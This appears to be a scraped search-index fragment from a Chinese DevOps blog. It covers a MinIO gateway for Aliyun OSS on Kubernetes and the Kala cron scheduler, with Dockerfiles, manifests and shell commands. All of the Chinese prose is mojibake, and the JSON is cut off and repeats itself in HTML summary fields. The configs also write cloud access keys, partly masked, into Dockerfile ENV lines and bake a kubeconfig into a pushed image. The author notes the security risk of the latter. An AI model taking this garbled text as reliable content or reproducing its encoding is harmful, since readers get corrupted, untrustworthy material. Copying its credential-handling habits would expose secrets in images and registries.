çš„ï¼Œæˆ‘ä»¬å¿…é¡»æ‰‹åŠ¨ä½œå‡ºé•œåƒï¼Œæ”¾åˆ°é•œåƒåº“é‡Œï¼Œç„¶åé˜¿é‡Œ ACK å†ä½¿ç”¨\né¦–å…ˆå»ä¸‹è½½é‚£ä¸€ç‰ˆç›´æ¥æ”¯æŒossçš„\nwget http://dl.minio.org.cn/server/minio/release/linux-amd64/archive/minio.RELEASE.2020-04-15T19-42-18Z chmod 755 minio.RELEASE.2020-04-15T19-42-18Z è¿™ä¸ªæ–‡ä»¶æ¯”è¾ƒå®è´µï¼Œç»™ä¸ªæœ¬åœ°å¤‡ä»½é“¾æ¥ä¸‹è½½ï¼š\nminio.RELEASE.2020-04-15T19-42-18Z\nç„¶ååœ¨å½“å‰ç›®å½•ç¼–è¾‘ Dockerfile ï¼Œå› ä¸º K8S å’Œ OSS åŒä¸€åœ°åŸŸï¼Œæ‰€ä»¥ç”¨ OSS ç§ç½‘åŸŸåï¼š\nFROM alpine:3.12 RUN apk add --update bash \u0026amp;\u0026amp; rm -rf /var/cache/apk/* COPY minio.RELEASE.2020-04-15T19-42-18Z /data/minio.RELEASE.2020-04-15T19-42-18Z ENV MINIO_ACCESS_KEY=LTAI5tFFTbsxxxxxuLb ENV MINIO_SECRET_KEY=t78PyGnHZilxxxxxdxBCjvNgtVC5Y WORKDIR /data EXPOSE 9000 CMD [\u0026#34;/data/minio.RELEASE.2020-04-15T19-42-18Z\u0026#34;,\u0026#34;gateway\u0026#34;,\u0026#34;oss\u0026#34;,\u0026#34;http://oss-cn-shanghai-internal.aliyuncs.com\u0026#34;] # CMD /bin/sh -c \u0026#34;while true; do echo hi; sleep 10; done\u0026#34; æ³¨æ„ä¸Šé¢ï¼ŒMINIO_ACCESS_KEY å’Œ MINIO_SECRET_KEY å¯¹åº”çš„æ˜¯é˜¿é‡Œäº‘ OSSçš„ AccessKey ID å’Œ AccessKey Secret\næ‰“å¼€é˜¿é‡Œäº‘ç½‘å€ï¼Œæ–°å»ºAccessKey ID å’Œ AccessKey Secret ï¼Œæ³¨æ„è¿™ä¸œè¥¿åªèƒ½çœ‹è§ä¸€æ¬¡ï¼Œä¹‹åå†ä¹Ÿä¸èƒ½æ˜æ–‡çœ‹äº†ï¼Œæ‰€ä»¥ç¬¬ä¸€æ¬¡åŠ¡å¿…ä¿å­˜å¥½ï¼ï¼ï¼\nhttps://ram.console.aliyun.com/manage/ak\nç„¶åè¿˜æœ‰ Dockerfile çš„æœ€åä¸€è¡Œï¼Œå…«æˆ’çš„ä¹ æƒ¯æ˜¯ä¿ç•™ä¸€ä¸ªæ­»å¾ªç¯ shellï¼Œå¦‚æœé•œåƒ CMD æœ‰é—®é¢˜ï¼Œæ— æ³•å¯åŠ¨ï¼Œå°±æ¢æˆè¿™ä¸ªå…ˆå¯åŠ¨ï¼Œç„¶åå†è¿›å»è°ƒè¯•ã€‚ï¼ˆç»å¸¸æœ‰ä»€ä¹ˆåº“é”™ã€é“¾æ¥æä¸å¥½éœ€è¦ä¿®æ”¹ï¼‰\ndocker build -t registry.cn-shanghai.aliyuncs.com/rendoumi/minio . ç„¶å push ä¸Šå»\ndocker push registry.cn-shanghai.aliyuncs.com/rendoumi/minio ç¼–å†™å¥½Deploymentå’Œsvcï¼Œå¦‚æœæƒ³å…¬å¼€è¿˜å¯ä»¥å†™ ingress å‘å¤–æš´éœ²ï¼Œè‡ªå·±å…¬å¸ç”¨è¿˜æ˜¯ port-forward æ›´å®‰å…¨\n--- apiVersion: apps/v1 kind: Deployment metadata: name: minio-deploy labels: app: minio spec: replicas: 1 selector: matchLabels: app: minio template: metadata: labels: app: minio spec: containers: - name: minio image: registry.cn-shanghai.aliyuncs.com/rendoumi/minio:latest ports: - containerPort: 9000 --- apiVersion: v1 kind: Service metadata: name: minio-svc labels: app: minio spec: ports: - name: http protocol: TCP port: 9000 targetPort: 9000 selector: app: minio type: ClusterIP ç„¶åå¼€è½¬å‘ï¼š\nkubectl port-forward svc/minio-svc 9000:9000 \u0026amp; ç”¨æµè§ˆå™¨è®¿é—® http://localhost:9000 å°±å¯ä»¥äº†ï¼Œè¿˜å¾—è¾“å…¥ä¸€éå¯†ç \nè¿™æ ·å°±å¯ä»¥çœ‹åˆ° OSS çš„æ‰€æœ‰æ¡¶äº†\nMinioçš„å®˜æ–¹å‘½ä»¤è¡Œå®¢æˆ·ç«¯æ˜¯ mcï¼Œä½¿ç”¨æ–¹æ³•å¦‚ä¸‹ï¼š\nwget https://dl.min.io/client/mc/release/linux-amd64/mc chmod 755 mc ./mc alias set minio http://minio-svc:9000 MINIO_ACCESS_KEY å’Œ MINIO_SECRET_KEY ./mc ls minio minio è·‘åœ¨å®¹å™¨å¤–è¿›è¡Œ OSS ä»£ç†çš„æ–¹æ³•ï¼Œæ³¨æ„ä¸åŒåœ°æ–¹ï¼ŒOSS çš„åŸŸåæ”¹ä¸ºå…¬ç½‘çš„äº†ï¼š\n#!/bin/sh export MINIO_ACCESS_KEY=LTAI5tFFTbsxxxxxuLb export MINIO_SECRET_KEY=t78PyGnHZilxxxxxdxBCjvNgtVC5Y nohup ./minio.RELEASE.2020-04-15T19-42-18Z gateway oss http://oss-cn-shanghai.aliyuncs.com \u0026gt;/dev/null 2\u0026gt;\u0026amp;1 \u0026amp; ","permalink":"https://rendoumi.com/posts/20211126-kubernetes_minio_oss_gateway/","summary":"\u003cp\u003eé˜¿é‡Œçš„äº‘çš„ OSS å¹¶ä¸æ˜¯å®Œå…¨ç‰ˆæœ¬çš„ AWS S3 å…¼å®¹ã€‚\u003c/p\u003e\n\u003cp\u003eæˆ‘ä»¬å¦‚æœéœ€è¦ç”¨ S3 åè®®è®¿é—® OSSï¼Œå°±æ¯”è¾ƒéº»çƒ¦äº†ã€‚\u003c/p\u003e\n\u003cp\u003eæ‰€ä»¥æ­å»ºä¸€ä¸ª minio æ¥åšç½‘å…³ï¼Œä»£ç†OSSï¼Œminio æ˜¯åŸºæœ¬å…¼å®¹S3çš„ï¼Œæ‰€ä»¥è¿™æ ·æ›²çº¿æ•‘å›½ï¼Œé€šè¿‡ S3 åè®®è®¿é—® minio æ¥è®¿é—®æœ€åç«¯çš„ OSS\u003c/p\u003e\n\u003cp\u003eè¿™é‡Œè¿˜æœ‰ä¸€æ®µæ•…äº‹ï¼š\u003c/p\u003e\n\u003cp\u003eMinio ä¸­é—´æœ‰ä¸€ç‰ˆæ˜¯æ”¯æŒ oss çš„ï¼Œä½†æ˜¯åæ¥ oss æ”¹äº†åè®®ï¼Œæ‰€ä»¥ç°åœ¨çš„æœ€æ–°ç‰ˆæœ¬ minio åè€Œæ˜¯ä¸æ”¯æŒä»£ç† oss çš„ï¼Œæˆ‘ä»¬å¿…é¡»æ‰‹åŠ¨ä½œå‡ºé•œåƒï¼Œæ”¾åˆ°é•œåƒåº“é‡Œï¼Œç„¶åé˜¿é‡Œ ACK å†ä½¿ç”¨\u003c/p\u003e\n\u003cp\u003eé¦–å…ˆå»ä¸‹è½½é‚£ä¸€ç‰ˆç›´æ¥æ”¯æŒossçš„\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ewget http://dl.minio.org.cn/server/minio/release/linux-amd64/archive/minio.RELEASE.2020-04-15T19-42-18Z \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003echmod \u003cspan class=\"m\"\u003e755\u003c/span\u003e minio.RELEASE.2020-04-15T19-42-18Z \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eè¿™ä¸ªæ–‡ä»¶æ¯”è¾ƒå®è´µï¼Œç»™ä¸ªæœ¬åœ°å¤‡ä»½é“¾æ¥ä¸‹è½½ï¼š\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"minio.RELEASE.2020-04-15T19-42-18Z\"\u003eminio.RELEASE.2020-04-15T19-42-18Z\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003eç„¶ååœ¨å½“å‰ç›®å½•ç¼–è¾‘ Dockerfile ï¼Œå› ä¸º K8S å’Œ OSS åŒä¸€åœ°åŸŸï¼Œæ‰€ä»¥ç”¨ OSS ç§ç½‘åŸŸåï¼š\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-ini\" data-lang=\"ini\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003eFROM alpine:3.12 \u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003eRUN apk add --update bash \u0026amp;\u0026amp; rm -rf /var/cache/apk/*  \u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003eCOPY minio.RELEASE.2020-04-15T19-42-18Z /data/minio.RELEASE.2020-04-15T19-42-18Z  \u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003eENV MINIO_ACCESS_KEY\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s\"\u003eLTAI5tFFTbsxxxxxuLb  \u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003eENV MINIO_SECRET_KEY\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s\"\u003et78PyGnHZilxxxxxdxBCjvNgtVC5Y  \u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003eWORKDIR /data  \u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003eEXPOSE 9000  \u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003eCMD [\u0026#34;/data/minio.RELEASE.2020-04-15T19-42-18Z\u0026#34;,\u0026#34;gateway\u0026#34;,\u0026#34;oss\u0026#34;,\u0026#34;http://oss-cn-shanghai-internal.aliyuncs.com\u0026#34;] \u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# CMD /bin/sh -c \u0026#34;while true; do echo hi; sleep 10; done\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eæ³¨æ„ä¸Šé¢ï¼ŒMINIO_ACCESS_KEY å’Œ MINIO_SECRET_KEY å¯¹åº”çš„æ˜¯é˜¿é‡Œäº‘ OSSçš„ AccessKey ID å’Œ AccessKey Secret\u003c/p\u003e","title":"kubernetesæ­å»ºminioä½œä¸ºé˜¿é‡ŒOSSçš„Gateway"},{"content":"æœ¬æ¥ k8s çš„ crontab æ˜¯å¯åŠ¨ä¸€ä¸ªå®¹å™¨æ¥è¿è¡Œçš„ï¼Œå¾ˆç®€å•ï¼Œå¦‚ä¸‹ï¼š\napiVersion: batch/v1beta1 kind: CronJob metadata: name: curl-cron spec: schedule: \u0026#34;*/1 * * * *\u0026#34; jobTemplate: spec: template: spec: containers: - name: curl-cron image: radial/busyboxplus:curl imagePullPolicy: IfNotPresent command: - /bin/sh - -c - date;echo \u0026#34;run crontab\u0026#34;;curl http://www.baidu.com restartPolicy: OnFailure successfulJobsHistoryLimit: 2 failedJobsHistoryLimit: 2 ä¸Šé¢å°±è·‘äº†ä¸€ä¸ª busybox çš„ podï¼Œæ¯åˆ†é’Ÿå»è®¿é—®ç™¾åº¦ï¼Œç„¶ååœ¨ stdout è¾“å‡ºç»“æœ\nè¿™ä¸ªæ²¡ä»€ä¹ˆï¼Œæ³¨æ„ä¸Šé¢æ–‡ä»¶çš„æœ€åä¸¤è¡Œã€‚é™åˆ¶æˆåŠŸä»¥åŠå¤±è´¥ job çš„ History æ•°é‡ï¼Œå¦‚æœä¸åŠ é™åˆ¶ï¼Œkubectl get pods ä¼šçœ‹åˆ°æ— ç©·æ— å°½çš„completed çŠ¶æ€çš„ curl-cron podã€‚\nåˆ†å‰²çº¿ï¼Œéƒ¨ç½² crontab çš„ yaml å¾ˆç®€å•ã€‚ä½†æ˜¯ï¼Œç°åœ¨äº§å“éƒ¨æœ‰ä¸ªéœ€æ±‚ï¼Œä»–ä»¬è¦åœ¨æŸä¸€å¤©è¿›è¡Œä¿ƒé”€æ´»åŠ¨ï¼Œå¤§æ¦‚2å¤©ï¼ŒæœŸé—´ä¼šæµé‡å¤§å¢ï¼Œäºæ˜¯æƒ³åº”ç”¨ hpa æ¥ä¼¸ç¼© podï¼Œæ´»åŠ¨ç»“æŸåå…³é—­ hpaã€‚ä¹‹åä»–ä»¬è¿˜ä¼šæœ‰ä¸æ–­çš„ä¿ƒé”€ï¼Œç ”å‘ä¸çŸ¥é“ä»€ä¹ˆæ—¶å€™å¼€å§‹ï¼Œä»€ä¹ˆæ—¶å€™ç»“æŸï¼›ä½†æ˜¯ç ”å‘åˆä¸æƒ³äº§å“éƒ¨çœ‹åˆ° yamlï¼Œå¹¶ä¸”éšæ—¶é…åˆéƒ¨ç½² hpaã€‚\nè¿˜æœ‰ä¸ªé—®é¢˜ï¼Œå¦‚æœç”¨crontabï¼Œé‚£ä¹ˆæ´»åŠ¨å¼€å§‹è¿è¡Œä¸€æ¬¡ï¼Œæ´»åŠ¨ç»“æŸä¸€æ¬¡ï¼Œæœ€åç ”å‘è¿˜å¾—æ¸…ç†åˆ é™¤æ‰è¿™ä¸¤ä¸ª crontab æ¥æ¢å¤æ­£å¸¸ã€‚\nè¿™ä¸‹éº»çƒ¦äº†ï¼Œæœ‰ä»€ä¹ˆé¡µé¢ç®¡ç† crontab çš„ç¥å™¨ï¼Œèƒ½è®©äº§å“éƒ¨è‡ªå·±è¿è¡Œï¼Œç„¶åæƒé™åˆ†ç¦»ï¼Œè€Œä¸”èƒ½æŒ‡å®šå†æœªæ¥çš„æŸå¤©è¿è¡Œä¸€æ¬¡æˆ–å¤šæ¬¡ï¼Œä¸”ä¸ç”¨æ‰‹å·¥æ¸…ç†å°±å¥½äº†ã€‚\nè¿˜çœŸçš„æœ‰ä¸€ä¸ªï¼Œkala å°±æ˜¯äº†ï¼ï¼ï¼\nKala æ˜¯ä¸€ä¸ªcronç®¡ç†é…ç½®å·¥å…·ï¼Œé¡¹ç›®åœ°å€ï¼š\nhttps://github.com/ajvb/kala\nå¡æ‹‰æ˜¯åŸºäº Airbnb çš„ Chronos ç¿»å†™çš„ Go ç¨‹åºã€‚\nå®ƒæ¯” crontab æ›´å¥½ä¸€äº›çš„æ˜¯ï¼Œå¯ä»¥æŒ‡å®šæœªæ¥æŸå¤©çš„ä¸€æ¬¡æ€§æ‰§è¡Œä»»åŠ¡ï¼Œæœ‰ä¸ªä½¿ç”¨ç•Œé¢\nKala å¯ä»¥æ‰§è¡Œæœ¬åœ°çš„å‘½ä»¤ï¼Œä¹Ÿå¯ä»¥å‘èµ· http çš„è¯·æ±‚ã€‚\næ³¨æ„ï¼Œkala çš„æºä»£ç é‡Œæœ‰ä¸€ä¸ªåœ°æ–¹éœ€è¦ä¿®æ”¹ï¼Œå¦åˆ™å‚æ•°bolt-pathä¸ç”Ÿæ•ˆï¼Œæˆ‘ä»¬æ”¹æ‰å®ƒè‡ªå·±ç¼–è¯‘ä¸ª2è¿›åˆ¶ç¨‹åºå‡ºæ¥ã€‚\nModify cmd/server.go switch viper.GetString(\u0026#34;jobdb\u0026#34;) { case \u0026#34;boltdb\u0026#34;: db = boltdb.GetBoltDB(viper.GetString(\u0026#34;boltpath\u0026#34;)) Change to db = boltdb.GetBoltDB(viper.GetString(\u0026#34;bolt-path\u0026#34;)) Run it : ./kala serve --jobdb=boltdb --bolt-path=/data/db æˆ‘ä»¬ç”¨ Dockerfile é€ ä¸€ä¸ªé•œåƒå‡ºæ¥ï¼š\nFROM alpine:3.12 RUN apk add --update bash \u0026amp;\u0026amp; rm -rf /var/cache/apk/* COPY . /data/ RUN mkdir /lib64 \u0026amp;\u0026amp; \\ ln -s /lib/libc.musl-x86_64.so.1 /lib64/ld-linux-x86-64.so.2 \u0026amp;\u0026amp; \\ mv /data/kubectl /bin \u0026amp;\u0026amp; \\ mv /data/.kube /root \u0026amp;\u0026amp; \\ rm -rf /data/Dockerfile WORKDIR /data EXPOSE 8000 CMD [\u0026#34;/data/kala\u0026#34;, \u0026#34;serve\u0026#34;,\u0026#34;--jobdb=boltdb\u0026#34;,\u0026#34;--bolt-path=/data/db\u0026#34;] #CMD /bin/sh -c \u0026#34;while true; do echo hi; sleep 10; done\u0026#34; æ³¨æ„ä¸Šé¢æˆ‘ä»¬æŠŠ kubectl å’Œ .kube é…ç½®ä¸€èµ·æ”¾è¿›äº†é•œåƒï¼Œå½“ç„¶ä¸€äº› yaml å’Œè„šæœ¬ä¹Ÿå¯ä»¥éƒ½æ‰“è¿›å»ï¼Œç„¶åæ¨åˆ°é˜¿é‡Œäº‘é•œåƒä»“åº“å»ï¼ˆæ³¨æ„å®‰å…¨é—®é¢˜ï¼‰ã€‚\nå¤‡æ³¨ ï¼škalaé»˜è®¤çš„ç«¯å£æ˜¯8000ï¼Œè®¿é—® url æ˜¯ /webui\nç„¶åæˆ‘ä»¬ç”Ÿæˆä¸€ä¸ª secret æ”¾è¿› k8s\nhtpasswd -c auth kala-auth New password: Re-type new password: Adding password for user kala kubectl create secret generic kala-auth --from-file=kala-auth secret \u0026#34;kala-auth\u0026#34; created kubectl get secret kala-auth -o yaml ç„¶åæˆ‘ä»¬å®šä¹‰ä¸€ç³»åˆ—çš„èµ„æºæ–‡ä»¶ï¼ŒDeploymentã€SVCã€Ingressï¼Œå…¶ä¸­ ingress å¼•ç”¨äº† kala-auth çš„ secretï¼Œå¹¶ä¸”æŒ‡å®šäº† app-root æ˜¯ /webui/ã€‚\nå¦å¤– kala ä½¿ç”¨äº† k8s-kala-5g çš„æŒä¹…åŒ–å·ï¼ŒåŠ¡å¿…äº‹å…ˆå‡†å¤‡å¥½ pv å’Œ pvcï¼Œä¸æŒä¹…åŒ–çš„è¯ pod ä¸€é‡å¯ï¼Œä¹‹å‰ä¿å­˜çš„é…ç½®ä¿¡æ¯å°±å…¨æ²¡äº†ã€‚\n--- apiVersion: apps/v1 kind: Deployment metadata: name: kala-deploy labels: app: kala spec: replicas: 1 selector: matchLabels: app: kala template: metadata: labels: app: kala spec: containers: - name: kala image: registry.cn-shanghai.aliyun.com/xxx/kala:latest imagePullPolicy: Always ports: - containerPort: 8000 volumeMounts: - mountPath: /data/db name: kala-data volumes: - name: kala-data persistentVolumeClaim: claimName: k8s-kala-5g --- apiVersion: v1 kind: Service metadata: name: kala-svc labels: app: kala spec: ports: - name: http protocol: TCP port: 8000 targetPort: 8000 selector: app: kala type: ClusterIP --- apiVersion: networking.k8s.io/v1beta1 kind: Ingress metadata: name: kala-com-ingress annotations: kubernetes.io/ingress.class: nginx nginx.ingress.kubernetes.io/block-cidrs: 111.201.134.93/32 nginx.ingress.kubernetes.io/auth-type: basic nginx.ingress.kubernetes.io/auth-secret: kala-auth nginx.ingress.kubernetes.io/auth-realm: \u0026#39;Authentication Required - Kala\u0026#39; nginx.ingress.kubernetes.io/app-root: \u0026#39;/webui/\u0026#39; spec: rules: - host: kala.rendoumi.com http: paths: - path: / backend: serviceName: kala-svc servicePort: 80 è¿™æ · kala å°±å¯ä»¥ä»å…¬ç½‘è®¿é—®äº†ï¼Œhttp://kala.rendoumi.com:8000/ ï¼Œä¸”éœ€è¦æä¾›å¯†ç æ‰èƒ½è¿›å…¥ã€‚\nä¸‹é¢è¯´ä¸€ä¸‹å…·ä½“çš„ç”¨æ³•ï¼Œè¿˜æ˜¯æœ‰ä¸€äº›æŠ€å·§æ€§çš„ï¼Œç™»å½•è¿›å»åçš„é¡µé¢ï¼š\nè¿›å…¥åå·¦ä¸Šè§’ç‚¹å‡» Create å»ºç«‹æ–°ä»»åŠ¡\nè¦å¡«å†™å†…å®¹å¦‚ä¸‹ï¼š\nJob nameï¼šèµ·ä¸ªåå­—ï¼Œå«ï¼šå¢å¤§HPA\nCommandï¼šè¦è¿è¡Œçš„è„šæœ¬ï¼š/data/resize.sh 35 (å›ºå®šæ‰©å¤§ECIçš„è„šæœ¬)\nScheduleï¼šR0/2021-07-07T06:00:00+08:00/PT0S\nâ€‹ è¿™ä¸ªæœ€é‡è¦\nâ€‹ è¿™è¡Œçš„æ ¼å¼æ˜¯è¿™æ ·çš„ï¼šNumber of times to repeat/Start Datetime/Interval Between Runs\nâ€‹ R0 é‡å¤0æ¬¡ï¼Œå³åªæ‰§è¡Œä¸€æ¬¡ï¼Œä¸é‡å¤\nâ€‹ 2021-07-06T06:00:00+8:00 æ—¶é—´æˆ³ï¼Œæ³¨æ„æ—¶åŒºä¸­å›½+8:00\nâ€‹ PT0S æ— å»¶è¿Ÿ0Så¯åŠ¨\nâ€‹ åˆèµ·æ¥å°±æ˜¯\nâ€‹ R0/2021-07-07T06:00:00+08:00/PT0S å°±æ˜¯åœ¨2021å¹´7æœˆ7æ—¥ä¸­å›½æ—¶é—´6ç‚¹æ— ä»»ä½•å»¶è¿Ÿæ‰§è¡Œä¸€æ¬¡è„šæœ¬ resize.sh\nReset Form è¿™ä¸ªä¸€å®šè¦é€‰æ‰ï¼Œä¿æŒç©ºï¼Œå¦åˆ™ä¸‹æ¬¡è¿›æ¥ä¸Šæ¬¡çš„æ•°æ®éƒ½æ²¡äº†ï¼Œè¿˜å¾—æ‰‹åŠ¨è¾“å…¥ï¼Œéº»çƒ¦ å…¶ä»–éƒ½ä¸å¡«å†™ï¼Œç„¶å Create å°±è¡Œäº†\nç„¶åæˆ‘ä»¬å¯ä»¥å†å»ºä¸€ä¸ªæ¢å¤çš„ä»»åŠ¡\næˆ‘ä»¬å»ç•Œé¢å°±å¯ä»¥çœ‹åˆ°å¤šäº†ä¸¤ä¸ªä»»åŠ¡ï¼Œå¢å¤§HPAå’Œæ¢å¤HPAï¼Œè¿™æ ·å°± OK äº†\næ³¨æ„ï¼šJOBä¸€æ—¦å»ºç«‹ï¼Œä»¥åå°±å¯ä»¥ç›´æ¥ä»ç•Œé¢ä¸Šæ‰‹åŠ¨æ‰§è¡Œï¼ŒRun Manually\nè¿™ä¸œè¥¿çœŸæ˜¯ä¸ªç¥å™¨ï¼Œäº§å“éƒ¨çš„åŒäº‹å¯ä»¥éšæ—¶ä¿®æ”¹hpaå’Œæ¢å¤ï¼Œè€Œä¸ç”¨é€šè¿‡ç ”å‘éƒ¨äº†ï¼Œå–„è«å¤§ç„‰ã€‚\n","permalink":"https://rendoumi.com/posts/20211125-kubernetes_crontab_kala/","summary":"\u003cp\u003eæœ¬æ¥ k8s çš„ crontab æ˜¯å¯åŠ¨ä¸€ä¸ªå®¹å™¨æ¥è¿è¡Œçš„ï¼Œå¾ˆç®€å•ï¼Œå¦‚ä¸‹ï¼š\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-yaml\" data-lang=\"yaml\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nt\"\u003eapiVersion\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"l\"\u003ebatch/v1beta1\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e\u003c/span\u003e\u003cspan class=\"nt\"\u003ekind\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"l\"\u003eCronJob\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e\u003c/span\u003e\u003cspan class=\"nt\"\u003emetadata\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e  \u003c/span\u003e\u003cspan class=\"nt\"\u003ename\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"l\"\u003ecurl-cron\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e\u003c/span\u003e\u003cspan class=\"nt\"\u003espec\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e  \u003c/span\u003e\u003cspan class=\"nt\"\u003eschedule\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;*/1 * * * *\u0026#34;\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e  \u003c/span\u003e\u003cspan class=\"nt\"\u003ejobTemplate\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e    \u003c/span\u003e\u003cspan class=\"nt\"\u003espec\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e      \u003c/span\u003e\u003cspan class=\"nt\"\u003etemplate\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e        \u003c/span\u003e\u003cspan class=\"nt\"\u003espec\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e          \u003c/span\u003e\u003cspan class=\"nt\"\u003econtainers\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e          \u003c/span\u003e- \u003cspan class=\"nt\"\u003ename\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"l\"\u003ecurl-cron\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e            \u003c/span\u003e\u003cspan class=\"nt\"\u003eimage\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"l\"\u003eradial/busyboxplus:curl\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e            